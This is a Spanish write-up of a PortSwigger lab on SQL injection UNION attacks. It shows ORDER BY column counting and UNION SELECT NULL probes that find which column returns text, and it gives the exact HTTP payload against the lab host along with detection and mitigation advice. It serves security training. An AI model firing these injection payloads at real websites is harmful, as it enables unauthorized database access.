# SQL injection UNION attack, finding a column containing text

**Categoría:** SQLi  
**Dificultad:** Practitioner  
**Fuente:** PortSwigger Web Security Academy

***

# 🎯 Resumen

*   **Objetivo del lab**: Identificar qué columna en la consulta vulnerable acepta datos de tipo texto, para poder inyectar cadenas y realizar ataques más avanzados.
*   **Vulnerabilidad principal**: SQL Injection en el parámetro `category`.
*   **Impacto esperado**: Base para ataques que requieren insertar texto (por ejemplo, funciones, credenciales, etc.).

***

# 🧭 Reconocimiento

*   **Mapa de la aplicación**: `/filter?category=<valor>` filtra productos por categoría.
*   **Parámetro relevante**: `category`.
*   **Consulta SQL sospechada**:

    ```sql
    SELECT col1, col2, col3
    FROM products
    WHERE category = '<USER_INPUT>' AND released = 1
    ```
*   **Hipótesis**: La consulta concatena la entrada sin sanitizar, permitiendo manipularla con `UNION SELECT`.

***

# 🛠️ Explotación paso a paso

## Paso 1 – Determinar número de columnas

*   **Qué hago**: Uso `ORDER BY` para descubrir cuántas columnas devuelve la consulta:
    *   `ORDER BY 1` → OK
    *   `ORDER BY 2` → OK
    *   `ORDER BY 3` → OK
    *   `ORDER BY 4` → **Error 500**
*   **Conclusión**: La consulta tiene **3 columnas visibles**.

***

## Paso 2 – Probar cada columna para inyectar texto

*   **Qué hago**: Construyo un `UNION SELECT` con `NULL` en todas las columnas excepto una, donde coloco una cadena única (`'1LtLI9'`).

*   **Pruebas**:
    *   Columna 1: `UNION SELECT '1LtLI9',NULL,NULL` → Error (tipo incompatible)
    *   Columna 2: `UNION SELECT NULL,'1LtLI9',NULL` → **OK**
    *   Columna 3: `UNION SELECT NULL,NULL,'1LtLI9'` → Error

*   **Conclusión**: **La segunda columna acepta texto**.

*   **Payload exitoso**:

    ```http
    GET /filter?category=Gifts' UNION SELECT NULL,'1LtLI9',NULL-- -
    Host: <lab-id>.web-security-academy.net
    ```

*   **Evidencia**: La cadena `'1LtLI9'` aparece en la respuesta y el lab se marca como **Solved**.

***

# ✅ PoC mínima

```http
GET /filter?category=Gifts' UNION SELECT NULL,'1LtLI9',NULL-- -
Host: <lab-id>.web-security-academy.net
```

***

# 🔒 Defensa

*   **Causas**: Falta de parametrización y validación de tipos en consultas SQL.
*   **Detección en logs**:
    *   Parámetros con `UNION SELECT` y cadenas inusuales.
    *   Errores de tipo en consultas SQL.
*   **Mitigación recomendada**:
    *   Consultas parametrizadas (*prepared statements*).
    *   Validación estricta de tipos y valores permitidos.
    *   Principio de mínimo privilegio en la base de datos.

***

# 📝 Notas y trampas

*   Si todas las columnas fallan con texto, puede que la consulta original no tenga columnas de tipo cadena visibles o puede que nos estemos enfrentando a una BBDD Oracle (**DUAL** necesario).
*   Usa cadenas únicas para confirmar visualmente la columna reflejada.
*   Este paso es crítico para ataques posteriores que requieren inyectar funciones o datos textuales.

***

# 📚 Referencias

*   [PortSwigger Lab – SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
*   [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)